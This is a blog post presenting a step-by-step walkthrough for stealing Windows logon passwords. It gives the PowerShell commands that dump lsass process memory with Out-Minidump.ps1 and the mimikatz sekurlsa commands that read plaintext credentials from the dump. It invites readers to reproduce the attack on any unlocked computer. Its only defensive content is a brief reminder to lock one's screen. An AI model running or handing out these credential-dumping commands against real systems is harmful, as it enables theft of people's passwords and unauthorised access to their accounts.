---
layout: post
title: Your Windows passwords are vulnerable and hackable in less than 5 minutes
description: This is simple how-to article demonstrating existing vulnerability that makes your Windows passwords are hackable.
keywords: Windows passwords, logon password, LsaProtectMemory, LsaUnprotectMemory, lsass.exe, Windows vulnerability, mimikatz terminal, powershell script, out-minidump, minidump
tags: [Windows, PowerShell, Vulnerability, Encryption, Decryption]
comments: true
---

> Did you know that your Windows passwords are vulnerable and hackable in less than 5 minutes?

Yep, even in Windows 10, the method is still working nicely. **The method is not new at all.** So, let me show how you can reproduce it by using a simple exploitation tool and a PowerShell script. **Anyone can perform this hacking when you left your computer unlocked.** I'm not really going to explain the details, just go straight to the steps. Google is on your fingertips if you are keen to explore more.

### Getting started

First, you need to download or get this tool called [mimikatz](https://github.com/gentilkiwi/mimikatz/releases/latest) (just get the binary package, e.g. **mimikatz_trunk.zip**) and this PowerShell script [Out-Minidump.ps1](https://raw.github.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1) by Matthew Graeber. Let's start!

### Using PowerShell to perform memory dump

To perform the [LSASS](https://technet.microsoft.com/en-us/library/cc961760.aspx) dump, we will use the PowerShell script, **Out-Minidump.ps1**. The flow of cmdlet will look like this:

![PowerShell cmdlet](http://i.imgur.com/1lQnyhZ.png)

```powershell
. 'G:\USERFILES\Desktop\PowerShell Playground\Out-Minidump.ps1'
# "dot sourcing" method to import function from the script

Get-Process lsass | Out-Minidump
# To perform the LSASS dump

Copy-Item .\lsass_868.dmp 'G:\USERFILES\Desktop\PowerShell Playground'
# Copy the dump file to desired location
```

### Using mimikatz terminal program to view the passwords

As you can see, `lsass_868.dmp` is the example of LSASS dump file captured using the PowerShell script. Now, it's time we use the mimikatz terminal to load in the dump file as follows:

```
sekurlsa::minidump "G:\USERFILES\Desktop\PowerShell Playground\lsass_868.dmp"
```

![mimikatz MINIDUMP](http://i.imgur.com/OPA0g0w.png)

Switching to MINIDUMP file, so now we can view the passwords. Now, run this command to display all the accounts and passwords available:

```
sekurlsa::logonPasswords full
```

![mimikatz logonPasswords](http://i.imgur.com/nWPZUIR.jpg)

Tadaa... Now I can see my actual Microsoft Account username and password in **a plain text**. As you imagine, most of people nowadays are still using the same password for almost everything. So, I expected you can picture all the consequences with this vulnerability...

### The existing vulnerability

The fact is that the password is encrypted but it's useless as the implementation depends on two basic Win32 functions; [LsaProtectMemory](https://msdn.microsoft.com/en-us/library/windows/desktop/ff714509%28v=vs.85%29.aspx) (the encryption function) and [LsaUnprotectMemory](https://msdn.microsoft.com/en-us/library/windows/desktop/ff714510(v=vs.85).aspx) (the decryption function). And Windows stores encrypted user passwords in memory without using one-way hash which is decryptable using **LsaUnprotectMemory** function to a plain text.

### The bottom line

You will be safe as long as you always lock your computer when you're away. For more explanations and security advices, you might want to check the [original article here](http://www.fixedbyvonnie.com/2015/02/hack-passwords-of-windows-in-5-minutes). This short article is just to remind me or anyone else to always be careful in whatever we do especially with anything to do with passwords and personal credential information. No system is perfect!
